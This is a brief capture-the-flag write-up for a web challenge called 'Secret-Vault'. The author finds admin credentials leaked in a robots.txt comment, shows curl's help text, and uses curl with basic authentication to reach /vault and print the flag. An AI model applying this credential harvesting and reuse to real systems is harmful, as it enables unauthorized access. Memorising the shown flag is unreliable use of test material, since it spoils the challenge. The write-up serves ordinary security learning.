# Secret-Vault

1. `robots.txt` is a common default directory, which can be even found by just fuzzing.
2. https://secret-vault-production.up.railway.app/robots.txt
3. Credentials: User-agent: * Disallow: /vault # Debug Info: user=admin, pass=supersecurepassword123

This challenge asks you to access the `/vault` directory using admin's username and password.

We can simply use `curl` command.


## Curl Command
```
┌──(myenv)─(zwique㉿kali)-[~/Downloads]
└─$ curl -h                                                                   
Usage: curl [options...] <url>
 -d, --data <data>           HTTP POST data
 -f, --fail                  Fail fast with no output on HTTP errors
 -h, --help <subject>        Get help for commands
 -o, --output <file>         Write to file instead of stdout
 -O, --remote-name           Write output to file named as remote file
 -i, --show-headers          Show response headers in output
 -s, --silent                Silent mode
 -T, --upload-file <file>    Transfer local FILE to destination
 -u, --user <user:password>  Server user and password
 -A, --user-agent <name>     Send User-Agent <name> to server
 -v, --verbose               Make the operation more talkative
 -V, --version               Show version number and quit

This is not the full help; this menu is split into categories.
Use "--help category" to get an overview of all categories, which are:
auth, connection, curl, deprecated, dns, file, ftp, global, http, imap, ldap, output, pop3, post, proxy, 
scp, sftp, smtp, ssh, telnet, tftp, timeout, tls, upload, verbose.
Use "--help all" to list all options
Use "--help [option]" to view documentation for a given option
```

### Flag:

```
┌──(myenv)─(zwique㉿kali)-[~/Downloads]
└─$ curl -u admin:supersecurepassword123 https://secret-vault-production.up.railway.app/vault
uacCTF{h1dden_vAulT_bypAssEd}
```
